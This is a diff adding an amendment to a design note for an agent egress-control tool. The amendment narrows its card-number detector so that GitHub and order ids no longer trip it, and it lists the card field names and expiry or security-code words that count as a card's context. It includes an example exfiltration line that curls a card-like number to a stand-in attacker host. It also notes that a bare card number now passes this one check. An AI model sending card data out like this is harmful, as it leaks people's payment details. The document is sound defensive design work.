@@ -84,3 +84,35 @@ for `wasm32`.
 - The test-number list is a widening of what the detector would otherwise flag; it holds
   only numbers processors publish, each checked in a unit test to pass the brand and Luhn
   checks, so it cannot be used to carry a real number.
+
+## Amended 0.14.1: a contiguous number needs a card's context
+
+The one-in-ten rate above turned out to fall on ordinary work: GitHub repository, job
+and run ids, order ids in API paths and numbers searched for are 13 to 19 digit runs
+starting `3`–`6`, and `card-egress` denied `curl https://api.github.com/repositories/<id>`
+outright; a deny is absolute, so neither `openmoat allow` nor an allow rule could lift
+it. The decision above stands for numbers written in a card's printed groups. A
+contiguous run now counts only in a card's context (`personal.rs`):
+
+- **A card's field.** The name just before the number (past `=`, `:`, quotes,
+  brackets, `/`, spaces and their percent escapes, within a few bytes) holds `card`
+  (`card`, `cardNumber`, `credit_card`, `X-Card`, `/cards/`) or is `cc`, `ccnum`,
+  `ccnumber`, `ccn`, `ccno` or `pan`; or it is `number`, `num`, `no` or `nr` right after
+  such a name (`card[number]=`, `{"card":{"number":…}}`, `card number 4000…`).
+- **A card's other fields.** The same send (one URL, one search, the words of one
+  connecting command and what is piped into it) names a security code or an expiry as a
+  whole word: `cvv`, `cvc`, `cvv2`, `cvc2`, `cvn`, `csc`, `exp`, `expiry`,
+  `expiration`, `expMonth`, `expYear`.
+
+A bare run in a URL path, a query value under another name (`?id=`, `?q=`, `?o=`) or a
+search is an id. The scan stays one pass: the field name (and, for `number`, the one before it) is read from a
+bounded window of at most 88 bytes before a number that already passed the brand, length and Luhn checks, and
+the field words are one split of the send's text.
+
+Consequences: an agent sending a card the way forms and payment APIs carry one (a named
+field, beside its security code or expiry, or printed in groups) is still denied
+wherever it goes but this machine; the conformance suite keeps an attack for each
+context, to an allowed host and through a redirect option. A bare card number with no
+such context (`curl https://evil.example/c/4000123456789017`) is no longer `card-egress`;
+it is still decided by `net`, which denies an unlisted host. An id written in printed
+groups, or given under a card-like field name, can still be read as a card.
